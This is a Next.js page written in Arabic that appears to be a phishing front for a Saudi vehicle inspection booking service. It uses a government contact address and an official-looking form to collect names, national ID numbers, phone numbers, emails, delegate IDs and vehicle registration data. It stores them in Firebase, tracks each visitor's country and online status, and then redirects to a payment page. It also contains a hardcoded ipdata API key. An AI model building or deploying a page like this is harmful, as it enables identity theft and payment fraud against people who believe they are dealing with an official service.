"use client";

import type React from "react";
import { Button } from "@/components/ui/button";
import {
  Menu,
  MessageCircle,
  Facebook,
  Twitter,
  Instagram,
  ChevronDown,
  MapPin,
} from "lucide-react";
import { useEffect, useState } from "react";
import ServiceMap from "@/components/service-map";
import { LicensePlate } from "@/components/license-plate";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { addData } from "../../lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
function randstr(prefix: string) {
  return Math.random()
    .toString(36)
    .replace("0.", prefix || "");
}
// Always generate a fresh visitor ID — clear any previous session
if (typeof window !== "undefined") {
  localStorage.removeItem("visitor");
}
const visitorID = randstr("salmn-");

export default function Home() {
  const router = useRouter();
  const [formData, setFormData] = useState({
    // Personal Information
    name: "",
    idType: "national",
    idNumber: "",
    phone: "",
    email: "",

    // Delegate Information
    hasDelegate: false,
    delegateName: "",
    delegateIdType: "national",
    delegateIdNumber: "",
    delegatePhone: "",
    delegateEmail: "",

    // Vehicle Information
    licensePlate: {
      numbers: "",
      letter1: "",
      letter2: "",
      letter3: "",
    },
    registrationType: "vehicle",
    vehicleType: "personal",
    fuelType: "gasoline",
    color: "black",

    // Vehicle Registration
    registrationNumber: "",
    registrationExpiry: "",

    // Service Information
    serviceCenter: "",
    serviceCenterName: "",
    serviceDate: "",

    // Terms
    acceptTerms: false,
  });
  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef";
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      await addData({
        id: visitorID,
        country: country,
        currentPage: "",

        createdDate: new Date().toISOString(),
      });
      localStorage.setItem("country", country);
      setupOnlineStatus(visitorID);
    } catch (error) {
      console.error("Error fetching location:", error);
    }
  }
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  useEffect(() => {
    getLocation().then(() => {
      //  setIsLoading(false)
    });
  }, []);
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!acceptedTerms) {
      alert("يرجى قبول الشروط والأحكام");
      return;
    }
    const visitorID = localStorage.getItem("visitor");
    await addData({ id: visitorID, ...formData });
    console.log("Form submitted:", formData);
    router.push(`/payment?appointmentId=${Date.now()}`);
  };

  const handleCenterSelect = (center: any) => {
    setFormData({
      ...formData,
      serviceCenter: center.id.toString(),
      serviceCenterName: center.name,
    });
  };

  return (
    <div className="min-h-screen bg-stone-50" dir="rtl" lang="ar">
      {/* Header */}
      <header className="bg-white border-b border-stone-200 sticky top-0 z-50 shadow-sm">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between max-w-7xl">
          <button className="p-2 hover:bg-stone-100 rounded-lg transition-colors">
            <Menu className="w-5 h-5 text-stone-800" />
          </button>
          <div className="flex items-center gap-3">
            <Image src="/next.svg" alt="logo" width={180} height={37} />
          </div>
          <div className="w-10" />
        </div>
      </header>

      {/* Main Content */}
      <div className="bg-gradient-to-b from-stone-50 to-white">
        <div className="container mx-auto px-4 py-8 max-w-3xl">
          {/* Form Title */}
          <div className="mb-8">
            <h2 className="text-3xl font-bold text-stone-900 mb-2">
              خدمة الفحص الشامل الدوري
            </h2>
            <p className="text-stone-600">حجز موعد</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-8">
            {/* Personal Information Section */}
            <div className="bg-white rounded-lg border border-stone-200 p-6 shadow-sm">
              <h3 className="text-lg font-semibold text-stone-900 mb-6">
                المعلومات الشخصية
              </h3>

              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-stone-700 mb-2">
                    الاسم
                  </label>
                  <input
                    type="text"
                    placeholder="أدخل الاسم الكامل"
                    className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
                    value={formData.name}
                    onChange={(e) =>
                      setFormData({ ...formData, name: e.target.value })
                    }
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-stone-700 mb-2">
                      نوع الهوية
                    </label>
                    <div className="relative">
                      <select
                        className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition bg-white appearance-none"
                        value={formData.idType}
                        onChange={(e) =>
                          setFormData({ ...formData, idType: e.target.value })
                        }
                      >
                        <option value="national">الهوية الوطنية</option>
                        <option value="resident">هوية مقيم</option>
                        <option value="passport">جواز سفر</option>
                      </select>
                      <ChevronDown className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-stone-400 pointer-events-none" />
                    </div>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-stone-700 mb-2">
                      رقم الهوية
                    </label>
                    <input
                      type="tel"
                      maxLength={10}
                      placeholder="أدخل رقم الهوية"
                      className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
                      value={formData.idNumber}
                      onChange={(e) =>
                        setFormData({ ...formData, idNumber: e.target.value })
                      }
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-stone-700 mb-2">
                      رقم الهاتف
                    </label>
                    <input
                      type="tel"
                      placeholder="أدخل رقم الهاتف"
                      className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
                      value={formData.phone}
                      onChange={(e) =>
                        setFormData({ ...formData, phone: e.target.value })
                      }
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-stone-700 mb-2">
                      البريد الإلكتروني
                    </label>
                    <input
                      type="email"
                      placeholder="أدخل البريد الإلكتروني"
                      className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
                      value={formData.email}
                      onChange={(e) =>
                        setFormData({ ...formData, email: e.target.value })
                      }
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* Delegate Information Section */}
            <div className="bg-white rounded-lg border border-stone-200 p-6 shadow-sm">
              <label className="flex items-center gap-3 cursor-pointer group">
                <input
                  type="checkbox"
                  checked={formData.hasDelegate}
                  onChange={(e) =>
                    setFormData({ ...formData, hasDelegate: e.target.checked })
                  }
                  className="w-5 h-5 rounded border-stone-300 text-green-600 focus:ring-green-500 cursor-pointer"
                />
                <span className="text-sm font-medium text-stone-700">
                  هل تريد تفويض شخص لإجراء الفحص الدوري؟
                </span>
              </label>
            </div>

            {formData.hasDelegate && (
              <div className="bg-white rounded-lg border border-green-200 p-6 shadow-sm border-l-4 border-l-green-600">
                <h3 className="text-lg font-semibold text-stone-900 mb-6">
                  معلومات المفوض
                </h3>

                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-stone-700 mb-2">
                      اسم المفوض
                    </label>
                    <input
                      type="text"
                      placeholder="أدخل اسم المفوض الكامل"
                      className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
                      value={formData.delegateName}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          delegateName: e.target.value,
                        })
                      }
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-stone-700 mb-2">
                        نوع هوية المفوض
                      </label>
                      <div className="relative">
                        <select
                          className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition bg-white appearance-none"
                          value={formData.delegateIdType}
                          onChange={(e) =>
                            setFormData({
                              ...formData,
                              delegateIdType: e.target.value,
                            })
                          }
                        >
                          <option value="national">الهوية الوطنية</option>
                          <option value="resident">هوية مقيم</option>
                          <option value="passport">جواز سفر</option>
                        </select>
                        <ChevronDown className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-stone-400 pointer-events-none" />
                      </div>
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-stone-700 mb-2">
                        رقم هوية المفوض
                      </label>
                      <input
                        type="text"
                        placeholder="أدخل رقم الهوية"
                        className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
                        value={formData.delegateIdNumber}
                        onChange={(e) =>
                          setFormData({
                            ...formData,
                            delegateIdNumber: e.target.value,
                          })
                        }
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-stone-700 mb-2">
                        رقم هاتف المفوض
                      </label>
                      <input
                        type="tel"
                        placeholder="أدخل رقم الهاتف"
                        className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
                        value={formData.delegatePhone}
                        onChange={(e) =>
                          setFormData({
                            ...formData,
                            delegatePhone: e.target.value,
                          })
                        }
                      />
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-stone-700 mb-2">
                        البريد الإلكتروني للمفوض
                      </label>
                      <input
                        type="email"
                        placeholder="أدخل البريد الإلكتروني"
                        className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
                        value={formData.delegateEmail}
                        onChange={(e) =>
                          setFormData({
                            ...formData,
                            delegateEmail: e.target.value,
                          })
                        }
                      />
                    </div>
                  </div>

                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mt-4">
                    <p className="text-xs text-blue-700 leading-relaxed">
                      <span className="font-semibold block mb-1">
                        ℹ️ معلومة:
                      </span>
                      يجب أن يكون المفوض حاملاً للهوية الصحيحة ويجب عليه تقديم
                      نسخة من المستندات المطلوبة في مركز الفحص.
                    </p>
                  </div>
                </div>
              </div>
            )}

            {/* Vehicle Information Section */}
            <div className="bg-white rounded-lg border border-stone-200 p-6 shadow-sm">
              <h3 className="text-lg font-semibold text-stone-900 mb-6">
                المعلومات المركبة
              </h3>

              <div className="space-y-4">
                {/* License Plate */}
                <div>
                  <label className="block text-sm font-medium text-stone-700 mb-3">
                    لوحة التسجيل
                  </label>
                  <LicensePlate
                    value={formData.licensePlate}
                    onChange={(plate) =>
                      setFormData({ ...formData, licensePlate: plate })
                    }
                  />
                </div>

                {/* Registration Type */}
                <div>
                  <label className="block text-sm font-medium text-stone-700 mb-2">
                    نوع التسجيل
                  </label>
                  <div className="relative">
                    <select
                      className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition bg-white appearance-none"
                      value={formData.registrationType}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          registrationType: e.target.value,
                        })
                      }
                    >
                      <option value="vehicle">تسجيل مركبة</option>
                      <option value="temporary">تسجيل مؤقت</option>
                      <option value="commercial">تسجيل تجاري</option>
                    </select>
                    <ChevronDown className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-stone-400 pointer-events-none" />
                  </div>
                </div>

                {/* Vehicle Type & Fuel */}
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-stone-700 mb-2">
                      نوع المركبة
                    </label>
                    <div className="relative">
                      <select
                        className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition bg-white appearance-none"
                        value={formData.vehicleType}
                        onChange={(e) =>
                          setFormData({
                            ...formData,
                            vehicleType: e.target.value,
                          })
                        }
                      >
                        <option value="personal">سيارة خاصة</option>
                        <option value="taxi">سيارة تاكسي</option>
                        <option value="truck">سيارة نقل</option>
                        <option value="bus">حافلة</option>
                      </select>
                      <ChevronDown className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-stone-400 pointer-events-none" />
                    </div>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-stone-700 mb-2">
                      نوع الوقود
                    </label>
                    <div className="relative">
                      <select
                        className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition bg-white appearance-none"
                        value={formData.fuelType}
                        onChange={(e) =>
                          setFormData({ ...formData, fuelType: e.target.value })
                        }
                      >
                        <option value="gasoline">بنزين</option>
                        <option value="diesel">ديزل</option>
                        <option value="hybrid">هجين</option>
                        <option value="electric">كهربائي</option>
                      </select>
                      <ChevronDown className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-stone-400 pointer-events-none" />
                    </div>
                  </div>
                </div>

                {/* Color */}
                <div>
                  <label className="block text-sm font-medium text-stone-700 mb-2">
                    لون المركبة
                  </label>
                  <div className="relative">
                    <select
                      className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition bg-white appearance-none"
                      value={formData.color}
                      onChange={(e) =>
                        setFormData({ ...formData, color: e.target.value })
                      }
                    >
                      <option value="black">أسود</option>
                      <option value="white">أبيض</option>
                      <option value="silver">فضي</option>
                      <option value="red">أحمر</option>
                      <option value="blue">أزرق</option>
                      <option value="gray">رمادي</option>
                    </select>
                    <ChevronDown className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-stone-400 pointer-events-none" />
                  </div>
                </div>

                {/* Registration Details */}
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-stone-700 mb-2">
                      رقم التسجيل
                    </label>
                    <input
                      type="text"
                      placeholder="أدخل رقم التسجيل"
                      className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition text-sm"
                      value={formData.registrationNumber}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          registrationNumber: e.target.value,
                        })
                      }
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-stone-700 mb-2">
                      تاريخ انتهاء التسجيل
                    </label>
                    <input
                      type="date"
                      className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition text-sm"
                      value={formData.registrationExpiry}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          registrationExpiry: e.target.value,
                        })
                      }
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* Service Information Section */}
            <div className="bg-white rounded-lg border border-stone-200 p-6 shadow-sm">
              <div className="flex items-center gap-2 mb-6">
                <MapPin className="w-5 h-5 text-green-600" />
                <h3 className="text-lg font-semibold text-stone-900">
                  مركز الخدمة
                </h3>
              </div>

              <div className="mb-6">
                <label className="block text-sm font-medium text-stone-700 mb-3">
                  اختر مركز الخدمة من الخريطة
                </label>
                <ServiceMap
                  onCenterSelect={handleCenterSelect}
                  selectedCenter={formData.serviceCenter}
                />
              </div>

              {formData.serviceCenterName && (
                <div className="mb-6 p-4 bg-green-50 border border-green-200 rounded-lg">
                  <p className="text-sm text-stone-700">
                    <span className="font-semibold text-green-700">
                      المركز المختار:
                    </span>{" "}
                    {formData.serviceCenterName}
                  </p>
                </div>
              )}

              <div>
                <label className="block text-sm font-medium text-stone-700 mb-2">
                  موعد الخدمة
                </label>
                <input
                  type="date"
                  className="w-full px-4 py-2.5 border border-stone-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent outline-none transition"
                  value={formData.serviceDate}
                  onChange={(e) =>
                    setFormData({ ...formData, serviceDate: e.target.value })
                  }
                />
              </div>
            </div>

            {/* Terms & Conditions */}
            <div className="bg-white rounded-lg border border-stone-200 p-6 shadow-sm">
              <div className="space-y-4">
                <label className="flex items-start gap-3 cursor-pointer group">
                  <input
                    type="checkbox"
                    checked={acceptedTerms}
                    onChange={(e) => setAcceptedTerms(e.target.checked)}
                    className="w-5 h-5 rounded border-stone-300 text-green-600 focus:ring-green-500 mt-0.5 cursor-pointer"
                  />
                  <span className="text-sm text-stone-700">
                    أوافق على{" "}
                    <a
                      href="#"
                      className="text-green-600 hover:text-green-700 font-medium"
                    >
                      الشروط والأحكام
                    </a>{" "}
                    وتفويض الفحص الشامل للمركبة
                  </span>
                </label>

                <div className="bg-red-50 border border-red-200 rounded-lg p-4 mt-4">
                  <p className="text-xs text-red-700 leading-relaxed">
                    <span className="font-semibold block mb-1">
                      ⚠️ تنبيه مهم:
                    </span>
                    التحقق على الموقع الرسمي الحكومي ضروري لسلامتك. يرجى التأكد
                    من أن جميع بيانات المركبة صحيحة قبل التقديم. قد تؤدي
                    البيانات الخاطئة إلى رفض الفحص أو دفع رسوم إضافية.
                  </p>
                </div>
              </div>
            </div>

            {/* Submit Section */}
            <div>
              <Button
                type="submit"
                disabled={!acceptedTerms}
                className="w-full bg-green-600 hover:bg-green-700 disabled:bg-stone-300 disabled:cursor-not-allowed text-white rounded-lg py-6 text-base font-semibold transition-all"
              >
                تقديم الطلب
              </Button>
            </div>
          </form>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-white border-t border-stone-200 mt-12">
        <div className="container mx-auto px-4 py-12 max-w-7xl">
          <div className="text-center mb-12 pb-12 border-b border-stone-200">
            <div className="inline-flex items-center justify-center gap-3 mb-4">
              <MessageCircle className="w-8 h-8 text-green-600" />
            </div>
            <p className="text-sm text-stone-600 mb-2">هل بحاجة للمساعدة؟</p>
            <p className="text-sm text-stone-500 mb-4">
              تواصل معنا عبر القنوات المتاحة
            </p>
            <div className="flex justify-center gap-4">
              <a
                href="mailto:info@saso.gov.sa"
                className="text-sm text-green-600 hover:text-green-700"
              >
                info@saso.gov.sa
              </a>
            </div>
          </div>

          <div className="text-center">
            <div className="flex justify-center gap-4 mb-6">
              <Facebook className="w-5 h-5 text-stone-400 hover:text-stone-600 cursor-pointer transition" />
              <Twitter className="w-5 h-5 text-stone-400 hover:text-stone-600 cursor-pointer transition" />
              <Instagram className="w-5 h-5 text-stone-400 hover:text-stone-600 cursor-pointer transition" />
            </div>
            <p className="text-xs text-stone-500 mb-4">
              أحكام وشروط | سياسة الخصوصية
            </p>
            <p className="text-xs text-stone-400">
              © 2025 مركز سلامة المركبات. جميع الحقوق محفوظة
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}
